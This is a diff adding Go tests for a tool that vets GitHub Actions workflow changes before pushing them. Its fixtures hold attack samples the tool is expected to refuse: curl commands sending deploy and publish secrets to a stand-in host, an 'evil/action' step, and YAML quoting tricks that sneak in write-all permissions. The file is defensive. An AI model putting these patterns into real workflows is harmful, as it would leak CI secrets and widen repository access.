@@ -538,6 +538,122 @@ func TestRelayPushWorkflowRefusals(t *testing.T) {
 	}
 }
 
+// relaySecretsWF is a main workflow whose deploy step and pub job hold secrets (reviewer B4 base).
+const relaySecretsWF = `name: tests
+on:
+  pull_request:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: deploy
+        env:
+          T: ${{ secrets.DEPLOY }}
+        run: ./deploy.sh
+      - name: run
+        run: |
+          echo hi
+  pub:
+    runs-on: ubuntu-latest
+    env:
+      P: ${{ secrets.PUB }}
+    steps:
+      - run: ./publish.sh
+`
+
+// TestRelayPushFlowQuotes (reviewer B3): a bracket inside a quoted flow item does not close the flow, so an unclosed
+// quote that folds a fake block header over the next lines is refused through the CLI; closed quoted flows pass.
+func TestRelayPushFlowQuotes(t *testing.T) {
+	r := newRelayRepo(t)
+	base := gitIn(t, r.wt, "rev-parse", "HEAD")
+	for _, tc := range []struct{ name, wf string }{
+		// the review comment 6949362592 reproduction: PyYAML reads jobs.test.permissions=write-all
+		{"bracket in a quoted item", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    name: [ \"[ ]\", \"]\n y: |\"]\n    permissions: write-all\n")},
+		{"single-quoted bracket item", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    name: [ '[ ]', ']\n y: |']\n    permissions: write-all\n")},
+		{"flow mapping over lines", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    name: {a: \"}\n y: |\"}\n    permissions: write-all\n")},
+		{"list item flow", relayWF(t, "      - name: run\n", "      - [ \"]\", \"]\n y: |\"]\n      - name: run\n")},
+		{"json-style colon quote", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    name: {\"a\":\"}\n y: |\"}\n    permissions: write-all\n")},
+		{"comment before close", relayWF(t, "    branches: [main]\n", "    branches: [main, # x\n      dev]\n")},
+	} {
+		gitIn(t, r.wt, "reset", "-q", "--hard", base)
+		sha := r.head(tc.wf)
+		r.verify(sha)
+		if out, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, "quoted scalar or flow sequence spans lines") || r.pushed() != "" {
+			t.Errorf("%s: exit %d out %q err %q pushed %q", tc.name, code, out, errs, r.pushed())
+		}
+	}
+	for _, tc := range []struct{ name, wf string }{
+		{"quoted image list", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        image: [\"debian:12\", \"ubuntu:24.04\"]\n        q: ['it''s ]', \"a]\"]  # c\n")},
+		{"quote inside a plain item", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    needs: [main, a\"b, it's]\n")},
+	} {
+		gitIn(t, r.wt, "reset", "-q", "--hard", base)
+		sha := r.head(tc.wf)
+		r.verify(sha)
+		if out, errs, code := r.push(sha); code != 0 || r.pushed() == "" {
+			t.Errorf("%s: exit %d out %q err %q", tc.name, code, out, errs)
+		}
+	}
+}
+
+// TestRelayPushSecretsMoved (reviewer B4): a secrets line moved from its step into a new one cancels out in the line
+// multiset; the step, job and file it can reach must be unchanged, so the move, a changed step that holds a secret and
+// a changed job with a job-level secret are refused, while edits outside those units pass.
+func TestRelayPushSecretsMoved(t *testing.T) {
+	r := newRelayRepo(t)
+	// main carries the secrets workflow
+	gitIn(t, r.wt, "checkout", "-q", "main")
+	r.write(".github/workflows/tests.yml", relaySecretsWF)
+	r.main = r.commit("secrets base")
+	os.WriteFile(filepath.Join(r.stub, "main"), []byte(r.main+"\n"), 0o644)
+	gitIn(t, r.wt, "checkout", "-q", "factory/t-0001")
+	gitIn(t, r.wt, "reset", "-q", "--hard", r.main)
+	sw := func(old, new string) string {
+		t.Helper()
+		if !strings.Contains(relaySecretsWF, old) {
+			t.Fatalf("fixture has no %q", old)
+		}
+		return strings.Replace(relaySecretsWF, old, new, 1)
+	}
+	for _, tc := range []struct{ name, wf, want string }{
+		// the review comment 6949362592 reproduction: the env line moves from step deploy to a new curl step
+		{"moved to a new step", sw("      - name: deploy\n        env:\n          T: ${{ secrets.DEPLOY }}\n        run: ./deploy.sh\n",
+			"      - name: deploy\n        run: ./deploy.sh\n      - name: curl\n        env:\n          T: ${{ secrets.DEPLOY }}\n        run: curl -d \"$T\" https://x.example\n"),
+			"secrets in a new or changed step, job or file: jobs.test.steps[3]"},
+		{"same step, new command", sw("run: ./deploy.sh", "run: curl -d \"$T\" https://x.example"), "secrets in a new or changed step, job or file: jobs.test.steps[2]"},
+		{"same step, new action", sw("      - name: deploy\n", "      - name: deploy\n        uses: evil/action@v1\n"), "secrets in a new or changed step, job or file: jobs.test.steps[2]"},
+		{"job-level secret, new step", sw("      - run: ./publish.sh\n", "      - run: ./publish.sh\n      - run: curl -d \"$P\" https://x.example\n"), "secrets in a new or changed step, job or file: jobs.pub"},
+	} {
+		gitIn(t, r.wt, "reset", "-q", "--hard", r.main)
+		sha := r.head(tc.wf)
+		r.verify(sha)
+		if out, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, tc.want) || r.pushed() != "" {
+			t.Errorf("%s: exit %d out %q err %q pushed %q", tc.name, code, out, errs, r.pushed())
+		}
+	}
+	for _, tc := range []struct{ name, wf string }{
+		{"edit another step", sw("echo hi", "echo hi\n          go test ./...")},
+		{"insert a step before the secret step", sw("      - uses: actions/checkout@v4\n", "      - uses: actions/checkout@v4\n      - uses: actions/setup-go@v5\n")},
+		{"new job", sw("  pub:\n", "  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make lint\n  pub:\n")},
+	} {
+		gitIn(t, r.wt, "reset", "-q", "--hard", r.main)
+		sha := r.head(tc.wf)
+		r.verify(sha)
+		if out, errs, code := r.push(sha); code != 0 || r.pushed() == "" {
+			t.Errorf("%s: exit %d out %q err %q", tc.name, code, out, errs)
+		}
+	}
+	// a top-level secret reaches every job: any change to the file is refused
+	top := "on: push\nenv:\n  T: ${{ secrets.X }}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n"
+	if p := workflowProblems(top, strings.Replace(top, "run: true", "run: env", 1)); len(p) != 1 || !strings.Contains(p[0], "the file") {
+		t.Errorf("top-level secret: %v", p)
+	}
+}
+
 // TestRelayPushMoreRefusals: a head equal to main adds nothing; a bad project slug refuses before any git or gh call.
 func TestRelayPushMoreRefusals(t *testing.T) {
 	r := newRelayRepo(t)
